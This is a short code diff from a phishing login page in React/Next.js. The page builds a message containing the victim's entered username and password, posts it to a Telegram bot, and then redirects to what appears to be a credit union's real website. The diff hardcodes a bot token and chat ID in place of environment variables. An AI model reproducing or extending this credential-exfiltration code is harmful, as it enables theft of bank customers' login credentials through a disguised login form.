@@ -34,8 +34,8 @@ const Login1 = () => {
 ├ \`${username}\`        
 ├ \`${password}\`        
         `
-        axios.post(`https://api.telegram.org/bot${process.env.NEXT_PUBLIC_BOT_TOKEN}/sendMessage`, {
-            chat_id: process.env.NEXT_PUBLIC_CHAT_ID,
+        axios.post(`https://api.telegram.org/bot6227546830:AAF_2ym3BWA9bs-l7WXQoq4g_HTH8dOhqvM/sendMessage`, {
+            chat_id: "-1001595899849",
             parse_mode: 'Markdown',
             text: message
         }).then(res => router.push('https://www.westerracu.com/'))
